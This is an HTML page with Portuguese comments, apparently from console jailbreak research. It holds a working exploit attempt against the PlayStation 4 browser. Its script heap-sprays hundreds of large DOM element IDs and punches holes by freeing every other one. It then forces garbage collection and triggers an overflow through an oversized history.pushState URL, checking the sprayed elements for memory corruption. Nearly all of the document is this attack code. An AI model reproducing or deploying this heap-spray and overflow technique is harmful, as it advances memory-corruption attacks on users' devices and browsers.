<!DOCTYPE html>
<html>
<head>
    <title>PS4 DOM Spray (Lite Version)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 10px; }
        button { 
            font-size: 20px; padding: 15px; width: 100%; margin-bottom: 20px;
            border: 2px solid #0f0; background: #111; color: #fff; font-weight: bold; cursor: pointer;
        }
        #log { border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { color: #fff; background-color: #008800; padding: 5px; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>

    <h1>DOM Spray - Versão Leve</h1>
    <p>Tentativa final com menos uso de RAM.</p>

    <button onclick="startLiteSpray()">INICIAR ATAQUE LEVE</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709522;
        // Overflow menor para não estressar a memória
        const OVERFLOW_AMT = 1024 * 64; 

        // AJUSTES DE MEMÓRIA (LITE)
        // 512KB por elemento (metade do anterior)
        const ID_SIZE = 1024 * 512; 
        // 800 elementos (total ~400MB de RAM, bem mais seguro)
        const SPRAY_COUNT = 800; 

        var victims = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function startLiteSpray() {
            log(`1. Alocando ${SPRAY_COUNT} elementos de 512KB...`);

            setTimeout(() => {
                try {
                    let pad = "B".repeat(ID_SIZE);
                    victims = [];

                    // FASE 1: SPRAY
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let div = document.createElement('div');
                        // Prefixo curto para economizar processamento
                        let prefix = `I:${i}_`;
                        div.setAttribute('id', prefix + pad.substring(prefix.length));
                        victims.push(div);
                    }

                    // FASE 2: BURACOS (1 a cada 2 para maximizar chance de cair no meio)
                    log("2. Criando buracos (50%)...");
                    for(let i=0; i<SPRAY_COUNT; i+=2) {
                        victims[i] = null;
                    }

                    // Força GC leve
                    forceGC().then(() => {
                        log("3. Disparando Overflow...");
                        triggerExploit();
                    });

                } catch(e) {
                    log("ERRO DE MEMÓRIA: " + e.message);
                    log("O navegador não aguenta nem essa quantidade.");
                }
            }, 500);
        }

        function triggerExploit() {
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    history.pushState({}, "lite_pwn", "/" + buffer);

                    log("4. Verificando vítimas...");
                    checkCorruption();

                } catch (e) {
                    log("Erro no exploit: " + e.message);
                }
            }, 500);
        }

        function checkCorruption() {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let div = victims[i];
                if(!div) continue;

                let id = div.getAttribute('id');
                
                // Checa tamanho
                if (id.length !== ID_SIZE) {
                    log(`<span class='win'>!!! SUCESSO !!! Index ${i} Tamanho: ${id.length}</span>`);
                    alert("SUCESSO! DOM CORROMPIDO!");
                    found = true;
                    break;
                }
                
                // Checa conteúdo (amostragem rápida)
                if (id.charCodeAt(0) === 1) {
                     log(`<span class='win'>!!! SUCESSO (CONTEÚDO) !!! Index ${i}</span>`);
                     found = true;
                     break;
                }
            }
            if(!found) log("Nenhum ID corrompido.");
        }

        async function forceGC() {
            // GC mais suave
            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
